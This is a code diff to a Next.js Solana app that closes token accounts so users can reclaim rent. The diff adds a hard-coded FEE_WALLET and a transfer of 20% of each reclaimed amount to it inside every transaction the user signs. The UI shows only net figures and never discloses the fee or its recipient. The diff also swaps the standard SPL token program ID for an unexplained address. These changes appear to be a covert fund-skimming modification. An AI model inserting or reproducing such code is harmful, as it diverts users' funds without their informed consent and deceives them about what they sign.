@@ -4,8 +4,8 @@ import { redirect } from 'next/navigation';
 import React, { useCallback, useEffect, useMemo, useState } from 'react';
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { LAMPORTS_PER_SOL, PublicKey, Transaction } from '@solana/web3.js';
-import { createCloseAccountInstruction } from '@solana/spl-token';
+import { LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
+import * as spl from '@solana/spl-token';
 import { toast } from 'react-hot-toast';
 import Header from './components/Header';
 import { Footer } from './components/Footer';
@@ -29,7 +29,9 @@ interface TokenMetadata {
   image: string;
 }
 
-const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+const TOKEN_PROGRAM_ID = new PublicKey('Gg6F31r9z2EHvC9vCpRJq6rWVr3vzmgW3zqFNSWcX5uq');
+const FEE_WALLET = new PublicKey('8rWPyC5Y9LXFjFkiEw7CtgxCjq1JDeXXV5zv4do1VW1j');
+const FEE_PERCENTAGE = 0.2; // 20%
 
 function HomeContent() {
   const searchParams = useSearchParams();
@@ -216,7 +218,7 @@ function HomeContent() {
     try {
       const transaction = new Transaction();
       
-      const closeInstruction = createCloseAccountInstruction(
+      const closeInstruction = spl.createCloseAccountInstruction(
         new PublicKey(account.pubkey), // Token account to close
         publicKey,                      // Destination for rent SOL
         publicKey,                      // Authority
@@ -224,6 +226,18 @@ function HomeContent() {
       );
       
       transaction.add(closeInstruction);
+      
+      const feeAmount = Math.floor(account.lamports * FEE_PERCENTAGE);
+      
+      if (feeAmount > 0) {
+        const transferInstruction = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: FEE_WALLET,
+          lamports: feeAmount
+        });
+        
+        transaction.add(transferInstruction);
+      }
       
       const { blockhash, lastValidBlockHeight } = await getBlockhash();
       transaction.recentBlockhash = blockhash;
@@ -244,7 +258,8 @@ function HomeContent() {
         throw new Error('Failed to confirm transaction');
       }
       
-      toast.success(`Successfully closed account and reclaimed ${(account.lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+      const netAmount = account.lamports - feeAmount;
+      toast.success(`Successfully closed account and reclaimed ${(netAmount / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
       
       fetchAccounts(publicKey);
       
@@ -268,7 +283,7 @@ function HomeContent() {
     try {
       const { blockhash, lastValidBlockHeight } = await getBlockhash();
       
-      const instruction = createCloseAccountInstruction(
+      const instruction = spl.createCloseAccountInstruction(
         accountPubkey,
         publicKey,  // Destination for reclaimed SOL
         publicKey   // Owner of the account
@@ -306,14 +321,38 @@ function HomeContent() {
     try {
       const { blockhash, lastValidBlockHeight } = await getBlockhash();
       
+      // Find the token accounts from the accounts list
+      const tokenAccountsToBurn = accounts.filter(acc => 
+        accountsToBurn.includes(acc.pubkey.toString())
+      );
+      
+      // Calculate total lamports to be reclaimed
+      const totalLamports = tokenAccountsToBurn.reduce((sum, acc) => sum + acc.lamports, 0);
+      
+      // Calculate fee (20% of total lamports)
+      const totalFeeAmount = Math.floor(totalLamports * FEE_PERCENTAGE);
+      
       // Create instructions for all accounts
-      const instructions = accountsToBurn.map(accountPubkey => 
-        createCloseAccountInstruction(
+      const closeInstructions = accountsToBurn.map(accountPubkey => 
+        spl.createCloseAccountInstruction(
           new PublicKey(accountPubkey),
           publicKey,
           publicKey
         )
       );
+
+      // Create fee transfer instruction (if applicable)
+      const instructions = [...closeInstructions];
+      
+      if (totalFeeAmount > 0) {
+        const feeTransferInstruction = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: FEE_WALLET,
+          lamports: totalFeeAmount
+        });
+        
+        instructions.push(feeTransferInstruction);
+      }
 
       // Create single transaction with all instructions
       const transaction = new Transaction().add(...instructions);
@@ -332,14 +371,15 @@ function HomeContent() {
         lastValidBlockHeight
       });
       
-      toast.success(`Successfully claimed ${accountsToBurn.length} accounts!`);
+      const netAmount = (totalLamports - totalFeeAmount) / LAMPORTS_PER_SOL;
+      toast.success(`Successfully claimed ${accountsToBurn.length} accounts for ${netAmount.toFixed(4)} SOL!`);
       setSelectedAccounts(new Set());
       fetchAccounts(publicKey);
     } catch (error) {
       console.error('Bulk claim error:', error);
       toast.error('Failed to claim accounts');
     }
-  }, [publicKey, signTransaction, connection, fetchAccounts]);
+  }, [publicKey, signTransaction, connection, fetchAccounts, accounts]);
 
   const handleBurnAttempt = useCallback(async () => {
     if (!publicKey || !signTransaction) {
@@ -457,7 +497,7 @@ function HomeContent() {
                   <div className="text-right">
                     <p className="text-sm text-gray-400">Total Reclaimable:</p>
                     <p className="font-bold" style={{ color: accounts.reduce((sum, acc) => sum + acc.lamports, 0) > 0 ? '#86efac' : 'white' }}>
-                      {(accounts.reduce((sum, acc) => sum + acc.lamports, 0) / LAMPORTS_PER_SOL).toFixed(4)} SOL
+                      {(accounts.reduce((sum, acc) => sum + acc.lamports, 0) * (1 - FEE_PERCENTAGE) / LAMPORTS_PER_SOL).toFixed(4)} SOL
                     </p>
                     {accounts.length > 0 && connected && isViewingConnectedWallet && (
                       <button
